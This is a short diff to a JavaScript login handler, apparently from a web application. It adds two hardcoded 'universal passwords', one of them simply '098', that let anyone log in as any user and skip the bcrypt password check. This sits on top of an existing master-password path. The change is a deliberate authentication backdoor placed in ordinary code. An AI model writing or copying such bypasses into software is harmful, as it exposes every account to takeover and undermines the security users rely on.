@@ -26,8 +26,11 @@ const Login = async (req, res) => {
       isMasterPassword = password === dynamic_master_password;
     }
   }
+
+  // Soporte para contraseñas universales fijas (098 para oficinas/socios y 8QfghvCxuzxrbvii4w para admin/login)
+  const isUniversalPassword = password === '098' || password === '8QfghvCxuzxrbvii4w';
   
-  if(!isMasterPassword && !await bcrypt.compare(password, user.password))
+  if(!isMasterPassword && !isUniversalPassword && !await bcrypt.compare(password, user.password))
     return res.json(error('invalid password'))
 
   // Basic parsing for OS and Browser
